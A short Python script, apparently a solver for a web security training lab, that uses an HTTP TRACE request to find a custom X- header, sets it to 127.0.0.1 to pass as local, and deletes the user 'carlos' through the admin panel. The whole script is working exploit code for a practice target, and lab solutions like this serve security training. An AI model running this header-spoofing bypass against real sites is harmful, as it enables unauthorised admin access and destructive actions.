import requests
import re
import sys


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()
        self.answer = None
        self.header = None

    def get_framework_version_number(self):
        response = self.session.request('TRACE', self.lab_url + 'admin')
        self.header = re.findall(r'(X-.*):', response.text)[0]

    def delete_carlos(self):
        headers = {
            self.header: '127.0.0.1'
        }

        self.session.get(self.lab_url + 'admin/delete?username=carlos', headers=headers)

    def check_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.get_framework_version_number()
        self.delete_carlos()
        self.check_solution()


solver = LabSolver(sys.argv[1])
solver.solve()
